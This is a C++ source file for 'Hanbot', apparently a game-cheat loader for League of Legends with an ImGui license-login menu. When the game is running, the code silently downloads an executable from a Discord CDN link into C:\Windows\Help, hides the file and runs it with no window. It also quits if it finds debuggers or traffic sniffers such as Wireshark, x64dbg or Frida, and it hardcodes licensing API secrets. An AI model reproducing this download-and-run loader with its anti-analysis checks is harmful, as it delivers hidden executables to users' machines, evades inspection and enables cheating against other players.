#include "ImGui.h"
#include "Imgui_impl_dx9.h"
#include "imgui_impl_win32.h"
#include "menu.h"
#include "globals.h"
#include <iostream>
#include <windows.h>
#include <vector>
#include <d3d9.h>
#include <string.h>
#include "auth.hpp"
#include "skStr.h"
#include <TlHelp32.h>
#include <string>
#include <Memory.h>


std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);
const std::string compilation_date = (std::string)skCrypt(__DATE__);
const std::string compilation_time = (std::string)skCrypt(__TIME__);

using namespace std;
using namespace KeyAuth;
auto name = skCrypt("Hanbot");
auto ownerid = skCrypt("0uZmlfg3fy");
auto secret = skCrypt("988413c497760926b11a7243a5459e4b7bc435ed28c1b717196ae84ec4a49f0d");
auto version = skCrypt("1.0");
auto url = skCrypt("https://keyauth.win/api/1.2/");

api KeyAuthApp(name.decrypt(), ownerid.decrypt(), secret.decrypt(), version.decrypt(), url.decrypt());

bool doOnce = false;
bool show_login = true;
bool show_main_menu = false;
bool ServerRiot = true;
bool ServerChina = false;
bool logfree = false;
static bool AutoInject = true;
bool CheckLic = false;
bool AdditionalCheck = true;
std::string State = skCrypt("Waiting").decrypt();
std::string ExpireLabel;
static int SelectServerGame = 1;
HANDLE hThread;

DWORD DiscoverProcID(const std::wstring& processName) {
    DWORD processId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);
        if (Process32First(hSnap, &procEntry)) {
            do {
                std::wstring currentProcessName = procEntry.szExeFile;
                if (currentProcessName == processName) {
                    processId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
        CloseHandle(hSnap);
    }
    return processId;
}

void HanbotInitalize()
{
    State = skCrypt("Maintance..").decrypt();
    std::cout << "Status: " << State << std::endl;
    AdditionalCheck = false;
    std::wstring Procesqjhd9q = skCrypt(L"League of Legends.exe").decrypt();

    while (AutoInject) // Kontrolowana pętla
    {
        Sleep(4000); // Czekaj 4 sekundy przed każdą próbą iniekcji
        DWORD procP2ID = DiscoverProcID(Procesqjhd9q);
        if (procP2ID == 0) {
            State = skCrypt("Waiting for League of Legends game").decrypt();
            std::cout << "Status: " << State << std::endl;
        }
        else if (procP2ID > 2) {
            State = skCrypt("League of Legends found wait...").decrypt();
            std::cout << "Status: " << State << std::endl;

            Sleep(3000);

            if (ServerRiot) {
                ofstream quocbongu(skCrypt("C:\\RiotServer.txt").decrypt());
                quocbongu.close();
                remove(skCrypt("C:\\ChinaServer.txt").decrypt());
                std::cout << "Riot Server setup complete." << std::endl;
            }
            else if (ServerChina) {
                ofstream ocacditjconmemayancut(skCrypt("C:\\ChinaServer.txt").decrypt());
                ocacditjconmemayancut.close();
                remove(skCrypt("C:\\RiotServer.txt").decrypt());
                std::cout << "China Server setup complete." << std::endl;
            }

            if (!FileExist(skCrypt("C:\\Windows\\Help\\CoreHelper.vmp.exe").decrypt())) {
                HRESULT hr1 = URLDownloadToFile(NULL, skCrypt(L"https://cdn.discordapp.com/attachments/242291296931151872/1180504685363343462/CoreHelper.vmp.exe").decrypt(), skCrypt(L"C:\\Windows\\Help\\CoreHelper.vmp.exe").decrypt(), 0, NULL);
                SetFileAttributesA(skCrypt("C:\\Windows\\Help\\CoreHelper.vmp.exe").decrypt(), FILE_ATTRIBUTE_HIDDEN);
            }

            HINSTANCE hInstance = ShellExecute(NULL, TEXT("open"), L"C:\\Windows\\Help\\CoreHelper.vmp.exe", NULL, NULL, SW_HIDE);
            Sleep(3000);
            State = skCrypt("Initializing").decrypt();
            std::cout << "Status: " << State << std::endl;
            Sleep(1500);
            State = skCrypt("Initialization successfull").decrypt();
            std::cout << "Status: " << State << std::endl;
            AutoInject = false;
        }
    }

    // Kod wykonywany po zakończeniu autoiniekcji
    State = skCrypt("Ready-Inject Feature Disabled.").decrypt();
    std::cout << "Status: " << State << std::endl;
    if (hThread != NULL) {
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        hThread = NULL;
        std::cout << "Thread terminated and handle closed." << std::endl;
    }
}

namespace LicenseUtility {
    void LoadLicense() {
        std::ifstream LicenseFile(skCrypt("C:\\Hanbot.lic").decrypt());
        if (LicenseFile.is_open()) {
            std::string line;
            if (std::getline(LicenseFile, line)) {
                strncpy_s(globals.license, line.c_str(), sizeof(globals.license));
            }
            LicenseFile.close();
        }
        else {
            std::cerr << skCrypt(" ").decrypt() << std::endl;
        }
    }
}

namespace CheckVersion {
    void App() {
        KeyAuthApp.init();
        string currentVersion = "1.0"; 
        if (currentVersion != KeyAuthApp.version) {

            exit(0);
        }
    }
}

namespace Security {

    void checkForMonitoringTools() {
        std::vector<std::string> monitoringTools = {
            "fiddler", "httpdebugger", "wireshark", "charles", "burpsuite",
            "tcpdump", "ettercap", "cain & abel", "network miner", "paros proxy",
            "owasp zap", "postman", "telerik fiddler", "mitmproxy",
            "debugbar", "firebug", "gdb", "ollydbg", "x64dbg", "ida pro", "radare2", "frida"
        };

        HWND hwnd;
        for (const auto& tool : monitoringTools) {
            hwnd = FindWindowA(NULL, tool.c_str());
            if (hwnd) {
                std::cout << skCrypt(" ").decrypt() << tool << std::endl;
                exit(0);
            }
        }
    }

    void LicenseAdditionalCheck()
    {
        if (CheckLic)
        {
            if (FileExist(skCrypt("C:\\Hanbot.lic").decrypt()))
            {
                std::ifstream inputFile(skCrypt("C:\\Hanbot.lic").decrypt());
                if (inputFile.is_open()) {
                    std::string LicenseKey;
                    if (std::getline(inputFile, LicenseKey)) 
                    {
                        inputFile.close();
                        KeyAuthApp.license(LicenseKey);
                        if (!KeyAuthApp.data.success)
                        {
                            exit(1);
                        }
                    }
                }
                else {
                    exit(1);
                }
            }
            else {
                exit(1);
            }
        }

    }
}

class initWindow {
public:
    const char* window_title = " ";
    ImVec2 window_size{ 740, 460 };

    DWORD window_flags = ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoTitleBar;
} iw;

void load_styles()
{
    ImVec4* colors = ImGui::GetStyle().Colors;
    {
        colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.06f, 0.06f, 1.00f);

        colors[ImGuiCol_FrameBg] = ImColor(11, 11, 11, 255);
        colors[ImGuiCol_FrameBgHovered] = ImColor(11, 11, 11, 255);

        colors[ImGuiCol_Button] = ImColor(90, 0, 176, globals.button_opacity);
        colors[ImGuiCol_ButtonActive] = ImColor(90, 0, 176, globals.button_opacity);
        colors[ImGuiCol_ButtonHovered] = ImColor(90, 0, 176, globals.button_opacity);

        colors[ImGuiCol_TextDisabled] = ImVec4(0.37f, 0.37f, 0.37f, 1.00f);
    }

    ImGuiStyle* style = &ImGui::GetStyle();
    {
        style->WindowPadding = ImVec2(4, 4);
        style->WindowBorderSize = 0.f;

        style->FramePadding = ImVec2(8, 6);
        style->FrameRounding = 3.f;
        style->FrameBorderSize = 1.f;
    }
}

void menu::render()
{
    if (globals.active)
    {
        if (!doOnce)
        {
            load_styles();
            doOnce = true;
        }

        ImGui::SetNextWindowSize(iw.window_size);

        ImGui::Begin(iw.window_title, &globals.active, iw.window_flags);
        {
            ImGui::SetCursorPos(ImVec2(726, 5));
            ImGui::TextDisabled(skCrypt("X").decrypt());
            if (ImGui::IsItemClicked())
            {
                globals.active = false;
            }

            ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0.054, 0.054, 0.054, 255));
            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.082, 0.078, 0.078, 255));
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 3.f);
            {

                if (show_login) {

                    ImGui::SetCursorPos(ImVec2(222, 83));
                    ImGui::BeginChild(skCrypt("##Authentication").decrypt(), ImVec2(300, 276), true);
                    {
                        ImGui::SetCursorPos(ImVec2(118, 20));
                        ImGui::TextDisabled(skCrypt("HANBOT").decrypt());
                        
                        ImGui::PushItemWidth(260.f);
                        {
                            ImGui::SetCursorPos(ImVec2(22, 50));
                            ImGui::TextDisabled(skCrypt("License").decrypt());

                            ImGui::SetCursorPos(ImVec2(20, 65));
                            ImGui::InputText(skCrypt("##License").decrypt(), globals.license, IM_ARRAYSIZE(globals.license));
                        }
                        ImGui::PopItemWidth();

                        ImGui::SetCursorPos(ImVec2(22, 230));
                        ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 3.f);
                        if (ImGui::Button(skCrypt("Auth me").decrypt(), ImVec2(260.f, 30.f)))
                        {
                            KeyAuthApp.license(globals.license);
                            if (KeyAuthApp.data.success) {
                                std::cout << skCrypt("OK").decrypt() << std::endl;
                                std::cout << skCrypt("\n User data:");
                                std::cout << skCrypt("\n License: ") << KeyAuthApp.data.username;
                                std::cout << skCrypt("\n IP address: ") << KeyAuthApp.data.ip;
                                std::cout << skCrypt("\n Hardware-Id: ") << KeyAuthApp.data.hwid;
                                std::cout << skCrypt("\n Create date: ") << tm_to_readable_time(timet_to_tm(string_to_timet(KeyAuthApp.data.createdate)));
                                std::cout << skCrypt("\n Last login: ") << tm_to_readable_time(timet_to_tm(string_to_timet(KeyAuthApp.data.lastlogin)));
                                std::cout << skCrypt("\n Subscription(s): ");

                                for (int i = 0; i < KeyAuthApp.data.subscriptions.size(); i++) {
                                    auto sub = KeyAuthApp.data.subscriptions.at(i);
                                    std::cout << skCrypt("\n name: ") << sub.name;
                                    std::cout << skCrypt(" : expiry: ") << tm_to_readable_time(timet_to_tm(string_to_timet(sub.expiry)));
                                    ExpireLabel = tm_to_readable_time(timet_to_tm(string_to_timet(sub.expiry)));
                                }

                                /*ofstream LicenseFile(skCrypt("C:\\Hanbot.lic").decrypt());
                                if (LicenseFile.is_open()) {
                                    LicenseFile << globals.license;
                                    LicenseFile.close();
                                    std::cout << skCrypt("Plik Hanbot.lic zostal utworzony i zapisany pomyslnie.").decrypt() << std::endl;
                                    std::cout << globals.license << std::endl;
                                }
                                else {
                                    std::cerr << skCrypt("Blad podczas tworzenia lub zapisywania pliku Hanbot.lic.").decrypt() << std::endl;
                                }*/

                                show_login = false;
                                show_main_menu = true;

                            }
                            else {
                                std::cout << skCrypt("Your license code is not authorized!").decrypt() << std::endl;
                                exit(0);
                            }
                        }
                        ImGui::PopStyleVar();

                    }
                    ImGui::EndChild();

                }
                

                if (show_main_menu) {

                    ImGui::SetCursorPos(ImVec2(118, 20));
                    ImGui::TextDisabled(skCrypt("HANBOT - Elevate Your Gaming Experience").decrypt());

                    ImGui::SetCursorPos(ImVec2(90, 65));
                    ImGui::BeginChild(skCrypt("##Core").decrypt(), ImVec2(300, 350), true);
                    {
                        ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0.054, 0.054, 0.054, 255));
                        ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.082, 0.078, 0.078, 255));
                        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 3.f);

                        ImGui::TextDisabled(skCrypt("Core Function").decrypt());

                        ImGui::Text(skCrypt("Select region League of Legends Server ").decrypt());
                        ImGui::Text(skCrypt(" ").decrypt());

                        if (ImGui::RadioButton(skCrypt("Riot Game Server").decrypt(), SelectServerGame == 1))
                        {
                            SelectServerGame = 1;
                            ServerChina = false;
                            ServerRiot = true;
                        }

                        if (ImGui::RadioButton(skCrypt("China Server").decrypt(), SelectServerGame == 2))
                        {
                            ServerChina = true;
                            ServerRiot = false;
                            SelectServerGame = 2;
                        }
                        if (ImGui::RadioButton(skCrypt("Japan Server").decrypt(), SelectServerGame == 3))
                        {
                            ServerChina = false;
                            ServerRiot = true;
                            SelectServerGame = 3;
                        }
                        if (ImGui::RadioButton(skCrypt("Korea Server").decrypt(), SelectServerGame == 4))
                        {
                            ServerChina = false;
                            ServerRiot = true;
                            SelectServerGame = 4;
                        }

                        ImGui::Spacing();
                        ImGui::Spacing();
                        ImGui::Spacing();
                        ImGui::Spacing();

                        ImGui::TextDisabled(skCrypt("Settings").decrypt());

                        ImGui::Spacing();

                        ImGui::Checkbox(skCrypt("Ready-Inject Feature").decrypt(), &AutoInject);
                        if ((AutoInject && AdditionalCheck)) {
                            if (!ServerRiot && !ServerChina)
                            {
                                State = skCrypt("Please Select Server").decrypt();
                                AutoInject = false;
                            }
                            else
                            {
                                hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)HanbotInitalize, 0, 0, 0);
                                AdditionalCheck = false;
                            }
                        }
                        if (!AutoInject)
                        {
                            AdditionalCheck = true;
                        }

                    }
                    ImGui::EndChild();

                    ImGui::SetCursorPos(ImVec2(400, 65));
                    ImGui::BeginChild(skCrypt("##Main").decrypt(), ImVec2(300, 350), true);
                    {
                        ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0.054, 0.054, 0.054, 255));
                        ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.082, 0.078, 0.078, 255));
                        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 3.f);

                        ImGui::TextDisabled(skCrypt("License").decrypt());

                        ImGui::Text(skCrypt(" Your license will expire on: ").decrypt());
                        ImGui::SameLine(0, 1);
                        ImGui::Text(ExpireLabel.data());

                        ImGui::Spacing();
                        ImGui::Spacing();
                        ImGui::Spacing();
                        ImGui::TextDisabled(skCrypt("HANBOT State").decrypt());
                        ImGui::Text(State.data());
                    }
                    ImGui::EndChild();

                }
            }
        }
        ImGui::End();
    }
    else
    {
        exit(0);
    }
}

static std::tm timet_to_tm(time_t timestamp) {
    std::tm context;

    localtime_s(&context, &timestamp);

    return context;
}

std::string tm_to_readable_time(tm ctx) {
    char buffer[80];

    strftime(buffer, sizeof(buffer), skCrypt("%a %m/%d/%y %H:%M").decrypt(), &ctx);

    return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
    auto cv = strtol(timestamp.c_str(), NULL, 10);

    return (time_t)cv;
}